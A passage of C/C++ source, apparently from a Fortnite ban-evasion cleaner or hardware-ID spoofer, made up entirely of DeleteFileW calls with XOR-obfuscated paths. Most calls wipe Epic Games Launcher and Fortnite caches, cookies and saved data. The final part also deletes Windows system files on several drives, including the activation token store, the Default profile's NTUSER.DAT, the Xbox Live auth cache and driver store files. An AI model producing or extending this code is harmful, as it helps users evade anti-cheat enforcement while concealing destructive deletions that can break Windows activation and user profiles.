	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000019"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001a"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001b"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001c"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001d"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001e"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001f"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000020"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000021"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000022"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000023"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000024"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000025"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000026"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000027"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000028"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002b"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002c"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002d"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002e"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002f"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000030"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000031"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000032"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000033"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000034"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000035"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000036"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000037"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000038"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000039"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003a"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003b"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003c"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003d"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003e"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003f"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000040"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000041"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000042"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000043"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000044"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000045"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000046"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cookies"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cookies-journal"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\databases\\Databases.db"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\databases\\Databases.db-journal"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_2"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_3"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\000003.log"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\CURRENT"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\LOCK"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\LOG"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\LOG.old"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\MANIFEST-000001"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_payment-website-pci.ol.epicgames.com_0.localstorage"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_payment-website-pci.ol.epicgames.com_0.localstorage-journal"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_ssl.kaptcha.com_0.localstorage"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_ssl.kaptcha.com_0.localstorage-journal"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\QuotaManager"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\QuotaManager-journal"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\5dff4910-44e7-4ef8-b06f-a66ce53e0e69\\fe0c4ca0c0cbe875_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\5dff4910-44e7-4ef8-b06f-a66ce53e0e69\\index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\5dff4910-44e7-4ef8-b06f-a66ce53e0e69\\index-dir\\the-real-index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\779a3f11-745c-419e-bb8b-5b6f2e7e0547\\index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\779a3f11-745c-419e-bb8b-5b6f2e7e0547\\index-dir\\the-real-index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\e6f1282c-98d7-452b-bbde-050c09a94995\\4bbf414005652440_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\e6f1282c-98d7-452b-bbde-050c09a94995\\index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\e6f1282c-98d7-452b-bbde-050c09a94995\\index-dir\\the-real-index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\0f02f0723dc027b2_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\8b79e197c1500c11_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\a8a9373a71443d80_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\a8a9373a71443d80_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\be52f68b51029c9d_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\eda4eea3ffd63d3b_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\eda4eea3ffd63d3b_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\f5fe54ed-e03a-40a0-80f8-d0350a52b7e3\\index-dir\\the-real-index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\index.txt"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\000003.log"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\CURRENT"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\LOCK"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\LOG"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\LOG.old"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\MANIFEST-000001"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\013888a1cda32b90_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\013888a1cda32b90_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\4cb013792b196a35_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\4cb013792b196a35_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\67a473248953641b_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\67a473248953641b_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\b6c28cea6ed9dfc1_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\b6c28cea6ed9dfc1_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\ba23d8ecda68de77_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\ba23d8ecda68de77_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\f1cdccba37924bda_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\f1cdccba37924bda_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\fa813c9ad67834ac_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\index-dir\\the-real-index"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Visited Links"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Cloud\\65f6b08d488442e694b1e23d152d971e\\ClientSettings.Sav"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-FA58D227408B75B949C1ECA1ABE0D4C7\\CrashReportClient.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config\\WindowsClient\\GameUserSettings.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Demos\\UnsavedReplay-2020.06.08-22.56.55.replay"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Logs\\FortniteGame.log"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\CacheAccess.json"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\2895B436A3CE70D8FCBBA971A99D7782F30E1715"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\2A6A06259337531EA5101E9BD8818AE92450FCE4"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\3FE1F488F87F34DD44870F1C28FEEF2E82324B1E"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\407DEAB1A83565509618D0A762FD07BB4889CA1A"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\611EBF87394DCC5D902B67C542206F029AE225F1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\6AB39DE3E2B3DFA4C3A8B927A27FE3BC4B60578E"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\7F8F7208B7E299A57B1E6963C221C4A896A7A97B"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\8C5C92275C748E36EF9BAF10D96D94275784622F"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\961B1FEC1E2362CF4FD638D26E622DE659AC92E9"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\AE2C6A4116D64799B1F8763C784FB0E70F7F0BFF"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\C6B9936C20CBD1BAC3492CDB1C9DE3942D67C703"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\D448A2D69B897D0CA64BC7EAD63C82B135B28C90"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\DFD1FBB2DEE6F543B86519B32AA15BE71656A59E"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\EF2FF9F36D089B164C185B6A2F674F7D4AED1C99"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\F005B0C18B5D2B42267BDF297A7FC7C62901554B"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\F127DEB22E390D0C299F3642BDF2B41D6E2A0B9C"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\F523678DF26F4E1038543E480569523090919F57"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\3460cbe1c57d4a838ace32951a4d7171"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\7e2a66ce68554814b1bd0aa14351cd71"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\a22d837b6a2b46349421259c0a5411bf"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b6c60402a72e4081a6a47c641371c19f"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b800b911053c4906a5bd399f46ae0055"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c52c1f9246eb48ce9dade87be5a66f29"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c7dee411e20a44ab930f841e8d206b1b"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\spp\\store\\2.0\\data.dat"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\spp\\store\\2.0\\tokens.dat"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat"));
	DeleteFileW(XorWideString(L"C:\\Users\\Public\\Libraries\\desktop.ini"));
	DeleteFileW(XorWideString(L"C:\\ProgramData\\ntuser.pol"));
	DeleteFileW(XorWideString(L"C:\\Users\\Default\\NTUSER.DAT"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat"));
	DeleteFileW(XorWideString(L"C:\\Windows\\INF\\keyboard.pnf"));
	DeleteFileW(XorWideString(L"C:\\Windows\\INF\\netrasa.pnf"));
	DeleteFileW(XorWideString(L"C:\\Windows\\INF\\netavpna.pnf"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en-US\\keyboard.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en-GB\\keyboard.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en\\keyboard.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en-GB\\bthpan.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en\\bthpan.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en-US\\bthpan.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en-GB\\netvwifimp.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en\\netvwifimp.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en-US\\netvwifimp.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en-GB\\b57nd60a.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en\\b57nd60a.inf_loc"));
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\DriverStore\\en-US\\b57nd60a.inf_loc"));
	DeleteFileW(XorWideString(L"D:\\Windows\\System32\\spp\\store\\2.0\\data.dat"));
	DeleteFileW(XorWideString(L"D:\\Windows\\System32\\spp\\store\\2.0\\tokens.dat"));
	DeleteFileW(XorWideString(L"D:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat"));
	DeleteFileW(XorWideString(L"D:\\Users\\Public\\Libraries\\desktop.ini"));
	DeleteFileW(XorWideString(L"D:\\ProgramData\\ntuser.pol"));
	DeleteFileW(XorWideString(L"D:\\Users\\Default\\NTUSER.DAT"));
	DeleteFileW(XorWideString(L"D:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat"));
	DeleteFileW(XorWideString(L"E:\\Windows\\System32\\spp\\store\\2.0\\data.dat"));
	DeleteFileW(XorWideString(L"E:\\Windows\\System32\\spp\\store\\2.0\\tokens.dat"));
	DeleteFileW(XorWideString(L"E:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat"));
	DeleteFileW(XorWideString(L"E:\\Users\\Public\\Libraries\\desktop.ini"));
	DeleteFileW(XorWideString(L"E:\\ProgramData\\ntuser.pol"));
